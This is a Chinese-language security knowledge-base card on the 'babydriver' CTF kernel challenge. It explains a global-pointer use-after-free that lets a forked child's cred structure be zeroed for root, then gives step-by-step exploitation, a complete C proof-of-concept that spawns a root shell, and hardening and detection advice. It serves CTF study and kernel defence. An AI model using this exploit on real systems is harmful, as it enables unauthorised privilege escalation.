---
id: binary-pwn-kernel-babydriver-cred-struct-uaf-hijack
title: babydriver 全局 buffer UAF：双 open + ioctl 释放 0xa8 块，fork 后 cred 复用并被 write 清零提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-babydriver-cred-uaf-hijack
tags:
- kernel
- pwn
- uaf
- cred
- fork
- kmalloc
- lpe
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:42:46+08:00'
  notes: 已读全文（无图）核对：babydriver 全局 device_buf、open 0x40、ioctl 0x10001/0xa8、release 只 kfree 不清指针、双 open+close+fork cred 复用+write 0x30 零化均一致；原文 memset(buf,0x30,0) 参数写反，卡内修正为 memset(buf,0,sizeof(buf))；解法二 tty 路线 double fault 且无成功回显，跳过合理；未本机复跑。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-babydriver-cred-struct-uaf-hijack/
draft: false
kb_aliases:
- babydriver
- cred 结构体劫持
- 内核全局指针 UAF
- 双 open 覆盖全局 buffer
- fork cred 复用
- kmalloc-192 cred 劫持
---

## 一句话结论

babydriver 模块把 `device_buf` 指针和长度放在全局结构体中，`open` 分配、`ioctl(0x10001)` 按用户指定大小重新分配、`release` 只 `kfree` 不清空指针；打开两个 fd 后用一个 fd 的 ioctl 把全局指针换成 0xa8 的新块并 close 释放，再 `fork()` 让子进程的 `cred` 复用该块，最后用另一个仍可写的 fd 把全零数据写进悬空指针指向的 cred，即可把 uid/gid/euid 等清零拿到 root。

## 原理

- **全局状态而非 per-file 状态**：`babydev_struct.device_buf` 与 `device_buf_len` 是模块全局变量。`open()` 里 `kmalloc(0x40)` 并赋值；`ioctl(fd, 0x10001, size)` 先 `kfree(device_buf)`，再 `kmalloc(size)`，更新全局指针和长度；`write()` 把用户 buffer `copy_from_user` 到全局指针，条件是 `device_buf_len > length`。
- **release 不置空**：`babyrelease()` 仅 `kfree(babydev_struct.device_buf)`，没有把指针设为 NULL，也没有引用计数；关闭任一 fd 都会释放全局指针当前指向的块。
- **双 open 制造 UAF 窗口**：
  1. `fd1 = open()` → 分配 A，全局指针 = A；
  2. `fd2 = open()` → 分配 B，全局指针 = B（A 丢失但未释放）；
  3. `ioctl(fd1, 0x10001, 0xa8)` → 释放 B，分配 C（0xa8），全局指针 = C；
  4. `close(fd1)` → `kfree(C)`，但全局指针仍 = C（悬空）；
  5. `fd2` 仍然打开，后续 `write(fd2, ...)` 仍走全局指针，因此能写已释放的 C。
- **cred 复用**：`fork()` 创建子进程时，内核从 `cred_jar`/kmalloc-192 缓存分配 `struct cred`（0xa8 左右），刚释放的 C 会被复用为该子进程的 cred。此时全局悬空指针正好指向子进程 cred 的起始地址。
- **清零 cred**：`struct cred` 开头依次是 `usage`、`uid`、`gid`、`suid`、`sgid`、`euid`、`egid`、`fsuid`、`fsgid` 等字段；向 C 写入 0x30 字节全零，会把 uid/gid/euid 等全部置 0（`usage` 变 0 可能带来引用计数问题，但在子进程立即执行 shell 的短窗口内可用）。`getuid()` 返回 0，随后 `system("/bin/sh")` 即以 root 运行。
- **为什么是数据攻击**：不需要执行内核代码、不需要 ROP/SMEP 绕过，只利用 UAF 写数据篡改 cred；这也是该老版本内核题最简解法。

## 触发条件

- 存在类似 babydriver 的字符设备模块：全局 buffer 指针 + 用户可控 `kmalloc` 大小 + `release` 只 `kfree` 不清指针。
- 设备可被普通用户多次 `open`，`ioctl` 命令可指定分配大小（本题 `0x10001`，大小 `0xa8`）。
- 目标内核的 `struct cred` 从与 `0xa8` 相同的 kmalloc 缓存分配（老版本内核常见；`cred_jar` 未单独隔离或大小匹配）。
- 能 `fork()` 新进程，且新进程 cred 复用刚释放的块；无 SMEP/SMAP 也不影响此数据攻击。
- 模块未开启 `CONFIG_DEBUG_CREDENTIALS`、未做 cred 完整性校验/随机化。

## 利用步骤

1. 打开 `/dev/babydev` 两次，得到 `fd1`、`fd2`；确认模块的 `open` 分配 0x40、全局指针被第二次 open 覆盖。
2. `ioctl(fd1, 0x10001, 0xa8)`：释放第二次 open 的块并分配 0xa8 新块，使全局指针指向与 cred 同尺寸的块。
3. `close(fd1)`：释放该 0xa8 块，但全局指针悬空；`fd2` 保持打开。
4. `fork()`：子进程创建 cred，内核复用刚释放的 0xa8 块；子进程继续执行利用代码。
5. 在子进程中 `write(fd2, zeros, 0x30)`：通过悬空全局指针把 cred 的 uid/gid/euid 等字段清零。
6. 检查 `getuid()==0`，执行 `system("/bin/sh")` 或读 `/flag`。
7. 若未成功，检查 kmalloc 缓存大小是否匹配（`cred` 实际大小）、是否被 `cred_jar` 隔离、`fork` 后是否有其他分配抢占该块；可用 gdb/printk 观察全局指针与 cred 地址。

## PoC

原文解法一（已修正 `memset` 参数顺序；地址/设备名按目标调整）：

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

int main(void) {
    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd1 < 0 || fd2 < 0) return 1;

    ioctl(fd1, 0x10001, 0xa8);   // free B, alloc C(0xa8)
    close(fd1);                  // free C, global pointer dangles

    if (fork() == 0) {           // child cred reuses C
        char buf[0x30];
        memset(buf, 0, sizeof(buf));
        write(fd2, buf, sizeof(buf));   // zero uid/gid/euid...
        if (getuid() == 0)
            system("/bin/sh");
        _exit(0);
    }
    wait(NULL);
    return 0;
}
```

核心时序：

```text
fd1=open -> A; fd2=open -> B (global=B)
ioctl(fd1,0x10001,0xa8) -> free(B), alloc C(0xa8), global=C
close(fd1) -> free(C), global still C (UAF)
fork() -> child cred = C (same kmalloc-192)
write(fd2, zeros, 0x30) -> cred.uid/gid/euid = 0
getuid()==0 -> /bin/sh
```

原文还给出第二种解法（tty_struct 劫持 + 伪造 tty_operations + `xchg esp,eax` 栈迁移 + `commit_creds`），但最终 exp 未附成功回显且中途出现 double fault，本卡不展开。

## 变体与关联

- 变体：不 fork，直接让其他同尺寸内核对象（如 `tty_struct`、`seq_operations`、`msg_msg`）复用该块，再劫持函数指针走 ROP（原文解法二即 tty_struct 路线）。
- 变体：只改 `cred->uid/gid/euid` 或 `cap_*` 字段，而不是整块清零；可避免 `usage` 归零导致的引用计数问题。
- 变体：若 `cred_jar` 单独缓存，可改用 `kmalloc-192` 的其他 victim 对象，或先做堆风水让 cred 分配到目标块。
- 关联：[[binary-pwn-kernel-kqueue-maxentries-intwrap-seqops-ret2usr]]（内核堆溢出 + seq_operations 劫持 ret2usr）、[[binary-pwn-kernel-kmem-cache-uaf-encoded-callback-hijack]]（kmem_cache UAF 回调劫持）、[[binary-pwn-kernel-task-struct-comm-scan-init-cred-lpe]]（任意读写后改 cred/token 的提权思路）、[[binary-pwn-heap-uaf-function-pointer-hijack]]（用户态 UAF 函数指针劫持基础）。

## 检测与防御

- **模块修复**：`release()` 中 `kfree` 后必须把全局指针置 NULL；不要用全局 buffer 保存 per-open 状态，改用 `file->private_data` 并为每个 fd 维护独立引用计数。
- **生命周期**：`ioctl` 重新分配前检查旧指针、加锁并保证没有其他 fd 仍引用；`open`/`release` 做配对引用计数，避免双 open 覆盖。
- **内核加固**：开启 `CONFIG_SLAB_FREELIST_HARDENED`、`CONFIG_SLAB_FREELIST_RANDOM`、`CONFIG_DEBUG_CREDENTIALS`、`CONFIG_HARDENED_USERCOPY`；使用 `cred_jar` 独立缓存、`CONFIG_RANDOM_KMALLOC_CACHES`（新内核）隔离 cred。
- **检测**：模块 `release` 后仍有 write/read 访问、同一设备 fd 数量异常、`fork` 后 cred 地址落在近期释放的 kmalloc 块、`getuid()` 突然为 0、非 setuid 进程执行 `/bin/sh` 获取 root。
